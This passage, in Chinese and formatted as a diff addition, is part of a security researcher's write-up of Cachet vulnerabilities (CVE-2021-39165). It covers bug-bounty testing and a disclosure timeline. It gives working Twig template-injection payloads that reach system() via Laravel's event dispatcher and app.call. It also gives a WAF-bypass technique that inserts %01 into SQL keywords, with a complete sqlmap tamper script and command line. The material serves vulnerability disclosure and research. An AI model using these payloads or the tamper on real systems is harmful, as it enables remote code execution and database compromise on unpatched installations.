@@ -1,0 +1,141 @@
+        $template = IncidentTemplate::forSlug($templateSlug)->first();
+        return $this->twig->render($template->template, $vars);
+    }
+其中`$vars`是用户从POST中传入的一个数组，这意味着注入到模板中的变量只是简单的字符串数组，没有任何对象。再加上前文说到的`_self`对象也被限制了，我发现很难找到可以被利用的方法。
+此时我关注到了rcrowe/twigbridge这个库。rcrowe/twigbridge用于在Laravel和Twig之间建立一个桥梁，让Laravel框架可以直接使用twig模板引擎。
+根据Laravel的依赖注入、控制反转的设计模式，如果要实现“桥梁”的功能，那么就需要编写一个Service Provider，在Service
+Provider中对目标对象进行初始化，并放在容器中。
+我在rcrowe/twigbridge的ServiceProvider中下了断点，捋了捋Twig初始化的过程，发现一个有趣的点：
+`baseTemplateClass`不是默认的`\Twig\Template`，而是一个自定义的`TwigBridge\Twig\Template`。`baseTemplateClass`就是在模板中，`_self`指向的那个对象的基类，是一个很重要的类。
+在src/Twig/Template.php中，我发现`$context`中有一个看起来很特殊的对象`__env`：
+    /**
+     * {@inheritdoc}
+     */
+    public function display(array $context, array $blocks = [])
+    {
+        if (!isset($context['__env'])) {
+            $context = $this->env->mergeShared($context);
+        }
+        if ($this->shouldFireEvents()) {
+            $context = $this->fireEvents($context);
+        }
+        parent::display($context, $blocks);
+    }
+在此处下断点可以看到，这个`__env`是一个`\Illuminate\View\Factory`对象，原来是Twig共享了Laravel原生View模板引擎中的全局变量。
+那么，我们可以找找`\Illuminate\View\Factory`类中是否有危险属性和函数。`\Illuminate\Events\Dispatcher`是Factory类的属性，其中存在一对事件监听函数：
+    public function listen($events, $listener, $priority = 0)
+    {
+        foreach ((array) $events as $event) {
+            if (Str::contains($event, '*')) {
+                $this->setupWildcardListen($event, $listener);
+            } else {
+                $this->listeners[$event][$priority][] = $this->makeListener($listener);
+                unset($this->sorted[$event]);
+            }
+        }
+    }
+    public function fire($event, $payload = [], $halt = false)
+    {
+        // ...
+        foreach ($this->getListeners($event) as $listener) {
+            $response = call_user_func_array($listener, $payload);
+它的限制主要是，回调函数必须是一个可以被自动创建与初始化的类方法，比如静态方法。我很快我找到了一对合适的回调`\Symfony\Component\VarDumper\VarDumper`，我们可以先调用setHandler将`$handler`设置成任意函数，再调用`dump`来执行：
+    class VarDumper
+    {
+        private static $handler;
+        public static function dump($var)
+        {
+            // ...
+            return call_user_func(self::$handler, $var);
+        }
+        public static function setHandler(callable $callable = null)
+        {
+            $prevHandler = self::$handler;
+            self::$handler = $callable;
+            return $prevHandler;
+        }
+    }
+构造出的模板代码如下，成功执行任意命令：
+    {{__env.getDispatcher().listen('ssti1', '\\Symfony\\Component\\VarDumper\\VarDumper@setHandler')}}
+    {% set a = __env.getDispatcher().fire('ssti1', ['system']) %}
+    {{__env.getDispatcher().listen('ssti2', '\\Symfony\\Component\\VarDumper\\VarDumper@dump')}}
+    {% set a = __env.getDispatcher().fire('ssti2', ['ping -n 1 127.0.0.1']) %}
+除了`__env`外，上下文中还被注入了一个`app`变量，这是一个`\Illuminate\Foundation\Application`对象，它的利用链就更简单了，因为其中有一个函数可以直接用来执行任意代码：
+    public function call($callback, array $parameters = [], $defaultMethod = null)
+    {
+        if ($this->isCallableWithAtSign($callback) || $defaultMethod) {
+            return $this->callClass($callback, $parameters, $defaultMethod);
+        }
+        $dependencies = $this->getMethodDependencies($callback, $parameters);
+        return call_user_func_array($callback, $dependencies);
+    }
+所以，我构造了一个模板代码来执行任意PHP函数，这个方法相对简单很多：
+    {{ app.call('md5', ['123456']) }}
+至此，我又搞定了后台代码执行。两个漏洞组合起来，就可以成功拿下Cachet系统权限。
+## 0x07 走向Bug Bounty
+前面说过，国外大量大厂都会使用Statuspage，所以我跑了一下hackerone、bugcrowd中使用了Cachet系统的厂商：
+不多，大部分厂商还是在用Statuspage.io。
+在实战中，我遇到了一个比较棘手的问题，大量厂商使用了WAF，这让GET型的注入变得很麻烦。解决这个问题的方法还是回归到代码审计中，Cachet获取用户输入是使用graham-campbell/binput，我在前面审计的时候发现其在获取输入的基础上会做一次过滤：
+    public function get($key, $default = null, $trim = true, $clean = true)
+    {
+        $value = $this->request->input($key, $default);
+        return $this->clean($value, $trim, $clean);
+    }
+跟进`clean()`我发现这个库最终对用户的输入做了一次处理：
+    protected function process($str)
+    {
+        $str = $this->removeInvisibleCharacters($str);
+        //...
+    }
+    protected function removeInvisibleCharacters($str, $urlEncoded = true)
+    {
+        $nonDisplayables = [];
+        if ($urlEncoded) {
+            $nonDisplayables[] = '/%0[0-8bcef]/';
+            $nonDisplayables[] = '/%1[0-9a-f]/';
+        }
+        $nonDisplayables[] = '/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S';
+        do {
+            $str = preg_replace($nonDisplayables, '', $str, -1, $count);
+        } while ($count);
+        return $str;
+    }
+`removeInvisibleCharacters()`方法将输入中的所有控制字符给替换成空了。那么，这个特性可以用于绕过WAF。
+正常的注入语句会被WAF拦截：
+在关键字`OR`中间插入一个控制字符`%01`，即可绕过WAF正常注入了：
+我写了一个简单的SQLMap Tamper来帮我进行这个处理：
+    #!/usr/bin/env python
+    import re
+    from lib.core.enums import PRIORITY
+    __priority__ = PRIORITY.LOWEST
+    KEYWORD_PATTERN = re.compile(r'\b[a-zA-Z]{2,}\b')
+    def dependencies():
+        pass
+    def tamper(payload, **kwargs):
+        """
+        Add %01 to all the keyword
+        >>> tamper("1 AND '1'='1")
+        "1 A%01ND '1'='1"
+        """
+        payload_list = list(payload)
+        offset = 0
+        for g in KEYWORD_PATTERN.finditer(payload):
+            start = g.start()
+            end = g.end()
+            m = (start + end) // 2
+            payload_list.insert(offset + m, '%01')
+            offset += 1
+        return ''.join(payload_list)
+使用这个tamper：
+    python sqlmap.py -u "https://target/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=o%02r+%27a%27=%3F%20a%01nd%201=1)*+--+" --tamper addinvisiblechars.py -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+简单提交了几个有Bug Bounty的厂商，均已得到了确认：
+## 漏洞时间线
+本文涉及的漏洞已经提交给Cachet官方，但是官方开发者不是很活跃，一直没有回应。在issue中找到了一个fork的厂商，相对比较活跃，也可以联系到维护人，于是以fork厂商的身份对漏洞进行了通报。
+以下是漏洞的生命时间线：
+  * Jul 19, 2021 - 漏洞发现
+  * Jul 20, 2021 - SQL注入提交给Laravel官方，Laravel并不认为是自己的问题
+  * Jul 19 ~ jul 30, 2021 - 对hakcerone、bugcrowd上的厂商进行测试，并提交漏洞
+  * Jul 27, 2021 - 漏洞提交给Cachet官方和Fork的维护者
+  * Jul 27, 2021 - 发现Fork的项目在此之前意外修复过这个漏洞
+  * Aug 27, 2021, 01:36 AM GMT+8 - 漏洞公告发布，确认编号CVE-2021-39165
+* * *
